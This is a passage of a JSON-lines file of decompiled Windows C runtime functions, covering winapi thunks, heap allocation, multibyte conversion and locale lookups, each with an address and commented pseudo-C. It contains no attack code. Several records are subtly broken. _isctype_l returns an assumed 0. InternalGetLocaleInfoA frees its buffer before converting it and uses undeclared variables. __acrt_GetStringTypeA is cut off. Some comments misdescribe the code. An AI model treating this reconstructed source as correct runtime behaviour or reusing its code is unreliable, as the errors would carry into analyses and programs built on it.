*)\"LCMapStringEx\");\n    \n    // Attempt to load the \"LCIDToLocaleName\" function and store its address\n    try_get_function(0x15, \"LCIDToLocaleName\", (module_id *)&lcid_to_locale_name_address, (module_id *)\"LCIDToLocaleName\");\n    \n    // Attempt to load the \"LocaleNameToLCID\" function and store its address\n    try_get_function(0x16, \"LocaleNameToLCID\", (module_id *)&locale_name_to_lcid_address, (module_id *)\"LocaleNameToLCID\");\n}\n"}
{"Function Name": "__acrt_initialize_winapi_thunks", "Address": "14001608c", "Source Code": "\nundefined8 __acrt_initialize_winapi_thunks(void)\n{\n    undefined8 globalValue = DAT_140038080; // Retrieve a value from a global variable\n    undefined8 *pointerToGlobalVar = &DAT_14003a330; // Pointer to another global variable\n    for (longlong loopCounter = 0x22; loopCounter != 0; loopCounter--) { // Loop 34 times (0x22 in hexadecimal)\n        *pointerToGlobalVar++ = globalValue; // Assign the value of uVar1 to the current pointer location and increment the pointer\n    }\n    return CONCAT71((int7)((ulonglong)globalValue >> 8), 1); // Return a concatenated value from uVar1 and 1\n}\n"}
{"Function Name": "__acrt_uninitialize_winapi_thunks", "Address": "1400160c0", "Source Code": "\nundefined8 __acrt_uninitialize_winapi_thunks(char inputParam)\n{\n    // Check if the input parameter is zero\n    if (inputParam == '\\0') {\n        // Initialize a pointer to the start of the library module array\n        undefined8 *libraryModulePtr = &DAT_14003a290;\n        \n        // Loop through the library module array until reaching the end\n        while (libraryModulePtr != &DAT_14003a330) {\n            // Retrieve the current library module handle\n            HMODULE currentLibModule = (HMODULE)*libraryModulePtr;\n            \n            // Check if the library module handle is valid\n            if (currentLibModule && currentLibModule != (HMODULE)0xffffffffffffffff) {\n                // Free the loaded library module\n                FreeLibrary(currentLibModule);\n                // Set the current pointer in the array to zero\n                *libraryModulePtr = 0;\n            }\n            // Move to the next library module in the array\n            libraryModulePtr++;\n        }\n    }\n    // Return a concatenated value with the upper part from the end of the array and a constant value of 1\n    return CONCAT71((int7)((ulonglong)&DAT_14003a330 >> 8), 1);\n}\n"}
{"Function Name": "_malloc_base", "Address": "140016104", "Source Code": "\nLPVOID allocate_memory(ulonglong requested_size)\n{\n    LPVOID allocated_memory; // Pointer to hold the allocated memory address\n    if (requested_size < 0xffffffffffffffe1) { // Check if requested size is within valid range\n        if (requested_size == 0) { // If requested size is zero\n            requested_size = 1; // Set size to 1 to allocate at least one byte\n        }\n        do {\n            allocated_memory = HeapAlloc(heap_handle, 0, requested_size); // Attempt to allocate memory from the heap\n            if (allocated_memory != (LPVOID)0x0) { // Check if allocation was successful\n                return allocated_memory; // Return the allocated memory pointer\n            }\n        } while (retry_allocation(requested_size) != 0); // Retry allocation if _callnewh indicates to do so\n    }\n    *set_error_code() = 0xc; // Set the error code to indicate allocation failure\n    return (LPVOID)0x0; // Return null pointer to indicate failure\n}\n"}
{"Function Name": "_calloc_base", "Address": "140016164", "Source Code": "\nLPVOID _calloc_base(ulonglong num_elements, ulonglong element_size)\n{\n    LPVOID allocated_memory; // Pointer to hold the allocated memory address\n    size_t total_bytes; // Variable to hold the total number of bytes to allocate\n\n    // Check if the parameters are valid for allocation\n    if ((num_elements == 0) || (element_size <= 0xffffffffffffffe0 / num_elements)) {\n        total_bytes = num_elements * element_size; // Calculate total bytes needed\n        if (total_bytes == 0) {\n            total_bytes = 1; // Ensure at least 1 byte is allocated if dwBytes is 0\n        }\n        do {\n            // Attempt to allocate memory from the heap\n            allocated_memory = HeapAlloc(DAT_14003a9e0, 8, total_bytes);\n            if (allocated_memory != (LPVOID)0x0) {\n                return allocated_memory; // Return the allocated memory if successful\n            }\n        } while (_callnewh(total_bytes) != 0); // Retry allocation if it fails\n    }\n    \n    *__doserrno() = 0xc; // Set the error code for allocation failure\n    return (LPVOID)0x0; // Return null pointer if allocation fails\n}\n"}
{"Function Name": "_mbstowcs_l_helper", "Address": "1400161dc", "Source Code": "\n__uint64 __cdecl\n_mbstowcs_l_helper(wchar_t *param_1, char *param_2, __uint64 param_3, __crt_locale_pointers *param_4)\n{\n    UINT UVar1; // Variable to hold the code page\n    int iVar2; // Variable to hold the return value of MultiByteToWideChar\n    ulong *puVar4; // Pointer for error handling\n    __uint64 _Var5 = 0; // Variable to hold the number of characters converted\n    byte *local_res10 = (byte *)param_2; // Local pointer to the input multi-byte string\n\n    // Check if the output wide character string is not null\n    if (param_1 != (wchar_t *)0x0) {\n        // Check if the input length is zero\n        if (param_3 == 0) {\n            return 0; // Return 0 if no characters to convert\n        }\n        *param_1 = L'\\0'; // Null-terminate the output string\n    }\n\n    // Check if the input multi-byte string is null\n    if (param_2 == (char *)0x0) {\n        puVar4 = __doserrno(); // Get the pointer to the DOS error number\n        *puVar4 = 0x16; // Set the error number to indicate invalid argument\n        FUN_14000ecf8(); // Call error handling function\n        return 0xffffffffffffffff; // Return an error code\n    }\n\n    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_48, param_4); // Update locale information\n    UVar1 = (local_40.locinfo)->lc_time_cp; // Get the current locale's code page\n\n    // Check if the code page is UTF-8\n    if (UVar1 == 0xfde9) {\n        _Var5 = __crt_mbstring::__mbsrtowcs_utf8(param_1, (char **)&local_res10, param_3, (_Mbstatet *)&local_res8); // Convert UTF-8 to wide char\n        goto LAB_1400163b1; // Go to the return section\n    }\n\n    // Check if the output wide character string is null\n    if (param_1 == (wchar_t *)0x0) {\n        _Var5 = 0xffffffffffffffff; // Set error code for null output\n        // Check if the locale name is null\n        if ((local_40.locinfo)->locale_name[2] == (wchar_t *)0x0) {\n            // Calculate the length of the input string\n            while (local_res10[_Var5] != 0) {\n                _Var5++; // Increment the length counter\n            }\n            goto LAB_1400163b1; // Go to the return section\n        }\n    }\n\n    // Call MultiByteToWideChar to get the required buffer size\n    iVar2 = __acrt_MultiByteToWideChar(UVar1, 9, (LPCSTR)local_res10, -1, (LPWSTR)0x0, 0);\n    // Check if the conversion was successful\n    if (iVar2 == 0) {\n        puVar4 = __doserrno(); // Get the pointer to the DOS error number\n        *puVar4 = 0x2a; // Set the error number to indicate invalid argument\n        goto LAB_1400163b1; // Go to the return section\n    }\n\n    // Check if the locale name is null\n    if ((local_40.locinfo)->locale_name[2] == (wchar_t *)0x0) {\n        // If there is space to convert\n        if (param_3 != 0) {\n            // Convert each character from multi-byte to wide char\n            while (_Var5 < param_3) {\n                *param_1 = (ushort)local_res10[_Var5]; // Convert and assign\n                if (local_res10[_Var5] == 0) break; // Stop at null terminator\n                _Var5++; // Increment the counter\n                param_1++; // Move to the next wide char\n            }\n        }\n        goto LAB_1400163b1; // Go to the return section\n    }\n\n    uint uVar7 = (uint)param_3; // Cast param_3 to uint for buffer size\n    // Perform the actual conversion from multi-byte to wide char\n    iVar2 = __acrt_MultiByteToWideChar(UVar1, 9, (LPCSTR)local_res10, -1, param_1, uVar7);\n    // Check if the conversion was successful\n    if (iVar2 == 0) {\n        DWORD DVar3 = GetLastError(); // Get the last error code\n        // Check if the error indicates a buffer too small\n        if (DVar3 == 0x7a) {\n            ulonglong uVar9 = param_3 & 0xffffffff; // Get the size of the input buffer\n            byte *pbVar6 = local_res10; // Pointer to the input string\n            uint uVar8 = uVar7; // Remaining size for output\n\n            // Loop through the input string to handle lead bytes\n            while (uVar8 != 0) {\n                uVar8--; // Decrement the remaining size\n                if (*pbVar6 == 0) break; // Stop at null terminator\n                iVar2 = _isleadbyte_l((uint)*pbVar6, &local_40); // Check for lead byte\n                // If it's a lead byte and the next byte is null, handle it\n                if ((iVar2 != 0) && (pbVar6++, *pbVar6 == 0)) goto LAB_14001634c;\n                pbVar6++; // Move to the next byte\n            }\n            // Convert the remaining multi-byte characters to wide char\n            iVar2 = __acrt_MultiByteToWideChar((local_40.locinfo)->lc_time_cp, 1, (LPCSTR)local_res10, (int)pbVar6 - (int)local_res10, param_1, uVar7);\n            _Var5 = (__uint64)iVar2; // Store the number of characters converted\n            if (iVar2 != 0) goto LAB_1400163b1; // If successful, go to return\n        }\n    LAB_14001634c:\n        puVar4 = __doserrno(); // Get the pointer to the DOS error number\n        *puVar4 = 0x2a; // Set the error number to indicate invalid argument\n        *param_1 = L'\\0'; // Null-terminate the output string\n        _Var5 = 0xffffffffffffffff; // Set error code\n        goto LAB_1400163b1; // Go to the return section\n    }\n    _Var5 = (longlong)iVar2 - 1; // Store the number of characters converted\nLAB_1400163b1:\n    return _Var5; // Return the number of characters converted\n}\n"}
{"Function Name": "_mbstowcs_s_l", "Address": "1400163e0", "Source Code": "\nerrno_t __cdecl\n_mbstowcs_s_l(size_t *_PtNumOfCharConverted, wchar_t *_DstBuf, size_t _SizeInWords, char *_SrcBuf,\nsize_t _MaxCount, _locale_t _Locale)\n{\n    ulong *puVar1; // Pointer to store the error number\n    __uint64 _Var2; // Variable to hold the result of the conversion\n    ulonglong uVar3; // Variable to hold the number of characters converted\n    ulong uVar4 = 0; // Variable to hold the error code\n    size_t sVar5; // Variable to determine the size for conversion\n\n    // Check if destination buffer is null\n    if (_DstBuf == (wchar_t *)0x0) {\n        // If size in words is not zero, set error and return\n        if (_SizeInWords != 0) {\n            puVar1 = __doserrno(); // Get pointer to the error number\n            *puVar1 = 0x16; // Set error code for invalid argument\n            FUN_14000ecf8(); // Call error handling function\n            return 0x16; // Return error code\n        }\n    } else if (_SizeInWords == 0) {\n        // If size in words is zero, set error and return\n        puVar1 = __doserrno(); // Get pointer to the error number\n        *puVar1 = 0x16; // Set error code for invalid argument\n        FUN_14000ecf8(); // Call error handling function\n        return 0x16; // Return error code\n    }\n\n    // Initialize destination buffer if not null\n    if (_DstBuf != (wchar_t *)0x0) {\n        *_DstBuf = L'\\0'; // Set first character to null\n    }\n    // Initialize number of characters converted if pointer is not null\n    if (_PtNumOfCharConverted != (size_t *)0x0) {\n        *_PtNumOfCharConverted = 0; // Set count to zero\n    }\n\n    // Update locale information\n    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_38, (__crt_locale_pointers *)_Locale);\n    // Determine the minimum size for conversion\n    sVar5 = (_SizeInWords < _MaxCount) ? _SizeInWords : _MaxCount;\n\n    // Check if size is within valid range\n    if (sVar5 < 0x80000000) {\n        // Perform the conversion\n        _Var2 = _mbstowcs_l_helper(_DstBuf, _SrcBuf, sVar5, local_30);\n        // Check for conversion error\n        if (_Var2 == 0xffffffffffffffff) {\n            // If conversion failed, reset destination buffer\n            if (_DstBuf != (wchar_t *)0x0) {\n                *_DstBuf = L'\\0'; // Set first character to null\n            }\n            puVar1 = __doserrno(); // Get pointer to the error number\n            uVar4 = *puVar1; // Store the error code\n            goto LAB_1400164e4; // Jump to return error code\n        }\n        uVar3 = _Var2 + 1; // Increment the number of characters converted\n        // Check if destination buffer can hold the converted string\n        if (_DstBuf != (wchar_t *)0x0) {\n            if (_SizeInWords < uVar3) {\n                // If not enough space, set error and reset buffer\n                if (_MaxCount != 0xffffffffffffffff) {\n                    *_DstBuf = L'\\0'; // Set first character to null\n                    puVar1 = __doserrno(); // Get pointer to the error number\n                    uVar4 = 0x22; // Set error code for insufficient space\n                    goto LAB_1400164c5; // Jump to handle error\n                }\n                uVar4 = 0x50; // Set error code for buffer overflow\n                uVar3 = _SizeInWords; // Adjust number of characters to size\n            }\n            _DstBuf[uVar3 - 1] = L'\\0'; // Null-terminate the destination buffer\n        }\n        // Update the number of characters converted if pointer is not null\n        if (_PtNumOfCharConverted != (size_t *)0x0) {\n            *_PtNumOfCharConverted = uVar3; // Set the count of converted characters\n        }\n    } else {\n        // If size exceeds limit, set error\n        puVar1 = __doserrno(); // Get pointer to the error number\n        uVar4 = 0x16; // Set error code for invalid argument\nLAB_1400164c5:\n        *puVar1 = uVar4; // Store the error code\n        FUN_14000ecf8(); // Call error handling function\n    }\nLAB_1400164e4:\n    return uVar4; // Return the error code or success\n}\n"}
{"Function Name": "mbstowcs_s", "Address": "140016514", "Source Code": "\nerrno_t __cdecl\nmbstowcs_s(size_t *_PtNumOfCharConverted, wchar_t *_DstBuf, size_t _SizeInWords, char *_SrcBuf, size_t _MaxCount)\n{\n    // Call the internal function _mbstowcs_s_l to perform the conversion\n    // Parameters:\n    // _PtNumOfCharConverted - pointer to store the number of characters converted\n    // _DstBuf - destination buffer for the wide character string\n    // _SizeInWords - size of the destination buffer in words\n    // _SrcBuf - source buffer containing the multibyte character string\n    // _MaxCount - maximum number of characters to convert from the source buffer\n    return _mbstowcs_s_l(_PtNumOfCharConverted, _DstBuf, _SizeInWords, _SrcBuf, _MaxCount, (_locale_t)0x0);\n}\n"}
{"Function Name": "_wcstombs_s_l", "Address": "14001689c", "Source Code": "\nerrno_t __cdecl\n_wcstombs_s_l(size_t *_PtNumOfCharConverted, char *_Dst, size_t _DstSizeInBytes, wchar_t *_Src,\n               size_t _MaxCountInBytes, _locale_t _Locale)\n{\n    size_t sVar3; // Variable to store the number of characters converted\n    errno_t eVar5 = 0; // Variable to store error codes\n\n    // Check if destination size is zero\n    if (_DstSizeInBytes == 0) {\n        // If destination is not null, set the first character to null terminator\n        if (_Dst != (char *)0x0) {\n            *_Dst = '\\0';\n        }\n        // If pointer for number of characters converted is not null, set it to zero\n        if (_PtNumOfCharConverted != (size_t *)0x0) {\n            *_PtNumOfCharConverted = 0;\n        }\n        return eVar5; // Return success with no characters converted\n    }\n\n    // If maximum count is zero, set it to a large value\n    if (_MaxCountInBytes == 0) {\n        _MaxCountInBytes = 0x80000000; // Set to maximum value for conversion\n    }\n\n    // Call helper function to perform the conversion\n    sVar3 = _wcstombs_l_helper(_Dst, _Src, _MaxCountInBytes, (__crt_locale_pointers *)_Locale);\n    // Check if the conversion failed\n    if (sVar3 == 0xffffffffffffffff) {\n        // If destination is not null, set the first character to null terminator\n        if (_Dst != (char *)0x0) {\n            *_Dst = '\\0';\n        }\n        return *__doserrno(); // Return the error code from errno\n    }\n\n    // Check if the number of characters converted exceeds the destination size\n    if (sVar3 + 1 > _DstSizeInBytes) {\n        // If maximum count is not the maximum value, set error and return\n        if (_MaxCountInBytes != 0xffffffffffffffff) {\n            *_Dst = '\\0'; // Null terminate the destination\n            *__doserrno() = 0x22; // Set error code for invalid argument\n            return 0x22; // Return error code\n        }\n        eVar5 = 0x50; // Set error code for buffer too small\n        sVar3 = 0; // Reset converted character count\n    }\n    _Dst[sVar3] = '\\0'; // Null terminate the destination string\n\n    // If pointer for number of characters converted is not null, store the count\n    if (_PtNumOfCharConverted != (size_t *)0x0) {\n        *_PtNumOfCharConverted = sVar3 + 1; // Store the number of characters converted\n    }\n    return eVar5; // Return any error code or success\n}\n"}
{"Function Name": "FUN_140016988", "Address": "140016988", "Source Code": "\nvoid FUN_140016988(longlong input_value, longlong *output_pointer)\n{\n    // Check if the value pointed to by param_2 is not equal to DAT_14003a448\n    // and if a specific bit in the value at (param_1 + 0x3a8) is not set\n    if ((*output_pointer != comparison_value) && ((bitmask & *(uint *)(input_value + 0x3a8)) == 0)) {\n        // Call FUN_14001b354 and assign its return value to the location pointed to by param_2\n        *output_pointer = (longlong)function_call();\n    }\n    // Exit the function\n    return;\n}\n"}
{"Function Name": "__acrt_update_multibyte_info", "Address": "1400169bc", "Source Code": "\nvoid __acrt_update_multibyte_info(longlong input_value, longlong *output_pointer)\n{\n    // Check if the value pointed to by param_2 is not equal to DAT_14003a9a0\n    // and if a specific bit in the data at param_1 + 0x3a8 is not set\n    if ((*output_pointer != reference_value) && ((bitmask & *(uint *)(input_value + 0x3a8)) == 0)) {\n        // Update the value pointed to by param_2 with the result of the thread multibyte data update\n        *output_pointer = __acrt_update_thread_multibyte_data();\n    }\n}\n"}
{"Function Name": "_isctype_l", "Address": "1400169f0", "Source Code": "\nint __cdecl _isctype_l(int characterCode, int characterType, _locale_t localePointer)\n{\n    int leadByteCheckResult; // Variable to store the result of lead byte check\n    int characterTypeResult; // Variable to determine the type of character\n    undefined1 stackSpace[32]; // Stack space for local variables\n    CHAR processedCharacter1; // Character variable for processing\n    CHAR processedCharacter2; // Character variable for processing\n    longlong localeInfo; // Variable for locale information\n    localeinfo_struct localeInfoStruct; // Structure to hold locale information\n    char specificCharacterType; // Variable to store a specific character type\n    WORD stringTypeInfo[4]; // Array to hold string type information\n    ulonglong securityCookie; // Variable for security cookie\n\n    // Initialize local_18 with a security cookie value\n    securityCookie = DAT_140038080 ^ (ulonglong)stackSpace;\n    \n    // Update locale information using the provided locale pointer\n    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&localeInfo, (__crt_locale_pointers *)localePointer);\n    \n    // Check if the character code is greater than 256\n    if (0x100 < characterCode + 1U) {\n        // Check if the character is a lead byte\n        leadByteCheckResult = _isleadbyte_l(characterCode >> 8 & 0xff, &localeInfoStruct);\n        // Determine the type of character based on lead byte check\n        characterTypeResult = (leadByteCheckResult == 0) ? 1 : 2;\n        // Assign the appropriate character value based on lead byte check\n        processedCharacter1 = (CHAR)((leadByteCheckResult == 0) ? characterCode : (characterCode >> 8));\n        processedCharacter2 = (CHAR)characterCode;\n\n        // Initialize the local_20 array to zero\n        stringTypeInfo[0] = 0;\n        stringTypeInfo[1] = 0;\n        stringTypeInfo[2] = 0;\n\n        // Get the string type information for the character\n        leadByteCheckResult = __acrt_GetStringTypeA((__crt_locale_pointers *)&localeInfoStruct, 1, &processedCharacter1, characterTypeResult, stringTypeInfo, (localeInfoStruct.locinfo)->lc_time_cp, 1);\n        \n        // If the string type check fails and local_28 is not null, modify locale information\n        if (leadByteCheckResult == 0 && specificCharacterType != '\\0') {\n            *(uint *)(localeInfo + 0x3a8) &= 0xfffffffd; // Clear a specific bit in locale information\n        }\n    }\n    \n    // If local_28 is not null, modify locale information again\n    if (specificCharacterType != '\\0') {\n        *(uint *)(localeInfo + 0x3a8) &= 0xfffffffd; // Clear a specific bit in locale information\n    }\n\n    // Perform a security check using the security cookie\n    __security_check_cookie(securityCookie ^ (ulonglong)stackSpace);\n    \n    // Return 0, assuming no specific return value is assigned in the original code\n    return 0; \n}\n"}
{"Function Name": "InternalGetLocaleInfoA", "Address": "140016b00", "Source Code": "\nint __cdecl\nInternalGetLocaleInfoA\n(__crt_locale_pointers *param_1,wchar_t *param_2,ulong param_3,char *param_4,int param_5)\n{\n    uint uVar1; // Variable to hold locale information\n    int iVar3; // Variable to store the result of locale info retrieval\n    ulonglong uVar4; // Variable for memory alignment calculations\n    LPWSTR pWVar5; // Pointer for wide character string\n    undefined1 auStack_88[64]; // Stack space for local variables\n    longlong local_48; // Local variable for locale update\n    char local_30; // Local variable for status flag\n    ulonglong local_28 = DAT_140038080 ^ (ulonglong)&local_48; // Security cookie for stack protection\n\n    // Initialize locale update with provided locale pointers\n    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_48,param_1);\n    uVar1 = *(uint *)(local_40 + 0xc); // Retrieve locale identifier\n    iVar3 = __acrt_GetLocaleInfoEx(param_2,param_3,(LPWSTR)0x0,0); // Get locale information\n    if (iVar3 == 0) goto LAB_140016c40; // Check for failure and jump if necessary\n\n    // Calculate required buffer size for wide character string\n    ulonglong uVar6 = (longlong)iVar3 * 2 + 0x10;\n    uVar6 = -(ulonglong)((ulonglong)((longlong)iVar3 * 2) < uVar6) & uVar6; // Ensure size is valid\n\n    if (uVar6 == 0) {\n        pWVar5 = (LPWSTR)0x0; // No memory needed if size is zero\n    } else {\n        // Allocate memory for wide character string if size exceeds threshold\n        if (0x400 < uVar6) {\n            pWVar5 = (LPWSTR)_malloc_base(uVar6); // Allocate memory\n            if (pWVar5 != (LPWSTR)0x0) {\n                pWVar5[0] = L'\\xdddd'; // Set initial value for memory validation\n                pWVar5[1] = L'\\0'; // Null-terminate the string\n            } else {\n                pWVar5 = (LPWSTR)0x0; // Allocation failed\n            }\n        } else {\n            // Use stack memory for smaller allocations\n            uVar4 = uVar6 + 0xf; // Align size to 16 bytes\n            if (uVar4 <= uVar6) {\n                uVar4 = 0xffffffffffffff0; // Ensure alignment\n            }\n            longlong lVar2 = -(uVar4 & 0xfffffffffffffff0); // Calculate offset for alignment\n            pWVar5 = (LPWSTR)((longlong)&local_48 + lVar2); // Set pointer to aligned memory\n            if (pWVar5 != (LPWSTR)0x0) {\n                pWVar5[0] = L''; // Set initial value for stack memory\n                pWVar5[1] = L'\\0'; // Null-terminate the string\n            }\n        }\n    }\n\n    // If memory allocation was successful, convert wide char to multi-byte\n    if (pWVar5 != (LPWSTR)0x0) {\n        if (*(int *)(pWVar5 + -8) == 0xdddd) {\n            _free_base(pWVar5 + -8); // Free allocated memory if it was dynamically allocated\n        }\n        *(undefined8 *)(puVar8 + -8) = 0x140016c24; // Set up for conversion\n        __acrt_WideCharToMultiByte(uVar1, 0, pWVar5, -1, param_4, param_5, 0, 0); // Perform conversion\n    }\n\nLAB_140016c40:\n    // Update status flag if necessary\n    if (local_30 != '\\0') {\n        *(uint *)(local_48 + 0x3a8) &= 0xfffffffd; // Clear specific flag\n    }\n    // Perform security check to ensure stack integrity\n    __security_check_cookie(local_28 ^ (ulonglong)&local_48);\n    return iVar3; // Return the result of locale info retrieval\n}\n"}
{"Function Name": "__acrt_GetLocaleInfoA", "Address": "140016c7c", "Source Code": "\nvoid __acrt_GetLocaleInfoA\n(__crt_locale_pointers *param_1, int param_2, wchar_t *param_3, ulong param_4, longlong *param_5)\n{\n    int iVar1; // Variable to store return value from locale info functions\n    errno_t eVar2; // Variable to store error codes from string operations\n    DWORD DVar3; // Variable to store the last error code\n    LPVOID pvVar4; // Pointer for allocated memory\n    LPWSTR pWVar5; // Pointer for wide string\n    undefined1 auStackY_108 [32]; // Stack space for security checks\n    ulonglong local_48; // Variable for storing a security cookie\n\n    local_48 = DAT_140038080 ^ (ulonglong)auStackY_108; // Initialize local_48 with a security cookie\n    *param_5 = 0; // Initialize output parameter to zero\n\n    if (param_2 == 1) { // Check if the locale type is 1\n        iVar1 = InternalGetLocaleInfoA(param_1, param_3, param_4, (char *)0x0, 0x80); // Get locale info\n        if (iVar1 != 0) { // If successful\n            pvVar4 = _calloc_base((longlong)iVar1, 1); // Allocate memory for the result\n            *param_5 = (longlong)pvVar4; // Store allocated memory address in output parameter\n            if ((*param_5 != 0) && // Check if memory allocation was successful\n                (eVar2 = strncpy_s((char *)*param_5, (longlong)iVar1, (char *)0x0, (longlong)(iVar1 + -1)), // Copy string\n                eVar2 != 0)) { // Check for errors in string copy\n                _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handling\n            }\n            goto LAB_140016e0d; // Jump to cleanup\n        }\n        DVar3 = GetLastError(); // Get the last error code\n        if (DVar3 != 0x7a) goto LAB_140016e0d; // If error is not \"ERROR_INSUFFICIENT_BUFFER\", jump to cleanup\n        iVar1 = InternalGetLocaleInfoA(param_1, param_3, param_4, (char *)0x0, 0); // Try to get locale info again with zero buffer\n        if (iVar1 == 0) goto LAB_140016e0d; // If still unsuccessful, jump to cleanup\n        pWVar5 = (LPWSTR)_calloc_base((longlong)iVar1, 1); // Allocate memory for wide string\n        if (pWVar5 != (LPWSTR)0x0) { // Check if allocation was successful\n            iVar1 = InternalGetLocaleInfoA(param_1, param_3, param_4, (char *)pWVar5, iVar1); // Get locale info into allocated memory\n            goto LAB_140016d7b; // Jump to process the result\n        }\n    } else if (param_2 == 2) { // Check if the locale type is 2\n        iVar1 = __acrt_GetLocaleInfoEx(param_3, param_4, (LPWSTR)0x0, 0); // Get locale info with Ex function\n        if (iVar1 == 0) goto LAB_140016e0d; // If unsuccessful, jump to cleanup\n        pWVar5 = (LPWSTR)_calloc_base((longlong)iVar1, 2); // Allocate memory for wide string\n        if (pWVar5 != (LPWSTR)0x0) { // Check if allocation was successful\n            iVar1 = __acrt_GetLocaleInfoEx(param_3, param_4, pWVar5, iVar1); // Get locale info into allocated memory\nLAB_140016d7b:\n            if (iVar1 != 0) { // If successful\n                *param_5 = (longlong)pWVar5; // Store allocated memory address in output parameter\n            }\n        }\n    } else if (param_2 == 0) { // Check if the locale type is 0\n        iVar1 = __acrt_GetLocaleInfoEx(param_3, param_4 | 0x20000000, (LPWSTR)0x0, 2); // Get locale info with modified flags\n        if (iVar1 != 0) { // If successful\n            *(undefined1 *)param_5 = (undefined1)0; // Set output parameter to zero\n        }\n    }\n    _free_base(pWVar5); // Free allocated memory for wide string\nLAB_140016e0d:\n    __security_check_cookie(local_48 ^ (ulonglong)auStackY_108); // Perform security check\n    return; // Exit the function\n}\n"}
{"Function Name": "__acrt_GetStringTypeA", "Address": "140016e44", "Source Code": "\nvoid __acrt_GetStringTypeA\n(__crt_locale_pointers *param_1,DWORD param_2,LPCSTR param_3,int param_4,\nLPWORD param_5,UINT param_6,int param_7)\n{\n    longlong lVar1; // Variable to hold a long long value\n    int iVar2; // Variable to hold an integer return value\n    ulonglong uVar3; // Variable to hold an unsigned long long value\n    undefined1 (*lpSrcStr) [16]; // Pointer to an array of undefined1 type\n    ulonglong uVar4; // Variable to hold an unsigned long long value for memory size\n    ulonglong uVar5; // Variable to hold an unsigned long long value\n    undefined1 auStackY_88 [32]; // Stack array for temporary storage\n    longlong local_58; // Local variable for storing locale-related data\n    char local_40; // Local character variable\n    ulonglong local_38; // Local variable for storing a checksum or mask\n\n    // XOR operation to initialize local_38 with a value\n    local_38 = DAT_140038080 ^ (ulonglong)&local_58;\n\n    // Update locale information\n    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_58,param_1);\n\n    // Check if param_6 is zero and assign it a default value if so\n    if (param_6 == 0) {\n        param_6 = *(UINT *)(local_58 + 0xc);\n    }\n\n    // Convert multi-byte string to wide character string\n    iVar2 = __acrt_MultiByteToWideChar\n    (param_6,(-(uint)(param_7 != 0) & 8) + 1,param_3,param_4,(LPWSTR)0x0,0);\n\n    // Check if the conversion was successful\n    if (iVar2 == 0) goto LAB_140016f98;\n\n    // Calculate the size needed for the wide character string\n    uVar5 = (longlong)iVar2 * 2;\n    uVar4 = -(ulonglong)(uVar5 < uVar5 + 0x10) & uVar5 + 0x10;\n\n    // Check if the calculated size is zero\n    if (uVar4 == 0) {\n        lpSrcStr = (undefined1 (*) [16])0x0; // Set pointer to null\n        goto LAB_140016f34; // Jump to cleanup\n    }\n\n    // Check if the size exceeds a certain limit\n    if (0x400 < uVar4) {\n        lpSrcStr = (undefined1 (*) [16])_malloc_base(uVar4); // Allocate memory\n        if (lpSrcStr != (undefined1 (*) [16])0x0) {\n            *(undefined4 *)*lpSrcStr = 0xdddd; // Initialize allocated memory\n            goto LAB_140016f2c; // Jump to further processing\n        }\n        goto LAB_140016f34; // Jump to cleanup if allocation failed\n    }\n\n    // Adjust size for alignment\n    uVar3 = uVar4 + 0xf;\n    if (uVar3 <= uVar4) {\n        uVar3 = 0xffffffffffffff0; // Ensure uVar3 is valid\n    }\n\n    // Calculate aligned memory address\n    lVar1 = -(uVar3 & 0xfffffffffffffff0);\n    lpSrcStr = (undefined1 (*) [16])((longlong)&local_58 + lVar1); // Set pointer to local memory\n\n    // Check if the pointer is valid\n    if (lpSrcStr != (undefined1 (*) [16])0x0) {\n        *(undefined4 *)*lpSrcStr = 0xcccc; // Initialize local memory\nLAB_140016f2c:\n        lpSrcStr = lpSrcStr + 1; // Increment pointer for next use\n        goto LAB_140016f34; // Jump to cleanup\n    }\n}\n"}
{"Function Name": "__acrt_LCMapStringA_stat", "Address": "140016fd4", "Source Code": "\nint __cdecl\n__acrt_LCMapStringA_stat\n(__crt_locale_pointers *param_1,wchar_t *param_2,ulong param_3,char *param_4,int param_5,\nchar *param_6,int param_7,int param_8,int param_9)\n{\n    wchar_t *pwVar2; // Pointer to wide character variable\n    int iVar3; // Variable to store the result of function calls\n    int iVar4; // Variable to store the adjusted parameter 5\n    size_t sVar5; // Variable to store the count of characters\n    ulonglong uVar6; // Variable for alignment calculations\n    LPCWSTR pWVar7; // Pointer to wide character string\n    LPCWSTR pWVar8; // Another pointer to wide character string (unused)\n    ulonglong uVar9; // Variable for size calculations\n    undefined1 auStackY_88[32]; // Unused stack space\n    wchar_t *local_38; // Local pointer to wide character string\n    ulonglong local_30; // Variable for stack protection\n\n    // Initialize local_30 for stack protection\n    local_30 = DAT_140038080 ^ (ulonglong)&local_38;\n    local_38 = param_2; // Assign the input wide character pointer to local variable\n    iVar4 = param_5; // Initialize iVar4 with the value of param_5\n\n    // Check if param_5 is greater than 0\n    if (0 < param_5) {\n        sVar5 = __strncnt(param_4, (longlong)param_5); // Count the number of characters in param_4\n        iVar3 = (int)sVar5; // Store the count as an integer\n        // Adjust iVar4 based on the count\n        iVar4 = (param_5 <= iVar3) ? iVar3 : iVar3 + 1;\n    }\n\n    // If param_8 is 0, retrieve the default value from the locale\n    if (param_8 == 0) {\n        param_8 = *(UINT *)(*(longlong *)param_1 + 0xc);\n    }\n\n    // Convert multi-byte string to wide character string\n    iVar3 = __acrt_MultiByteToWideChar(param_8, (-(uint)(param_9 != 0) & 8) + 1, param_4, iVar4, (LPWSTR)0x0, 0);\n    // Check if conversion was successful\n    if (iVar3 == 0) goto LAB_1400172a1; // Jump to cleanup if failed\n\n    // Calculate the size needed for the wide character string\n    uVar9 = (longlong)iVar3 * 2 + 0x10;\n    uVar9 = -(ulonglong)((ulonglong)((longlong)iVar3 * 2) < uVar9) & uVar9;\n\n    // Check if size is zero\n    if (uVar9 == 0) {\n        pWVar7 = (LPCWSTR)0x0; // Set pointer to null if size is zero\n    } else {\n        // Allocate memory for wide character string\n        if (uVar9 < 0x401) {\n            uVar6 = uVar9 + 0xf; // Align size for allocation\n            if (uVar6 <= uVar9) {\n                uVar6 = 0xffffffffffffff0; // Ensure minimum alignment\n            }\n            pWVar7 = (LPCWSTR)((longlong)&local_38 - (uVar6 & 0xfffffffffffffff0)); // Use stack allocation\n            if (pWVar7 == (LPCWSTR)0x0) goto LAB_1400170df; // Check for null 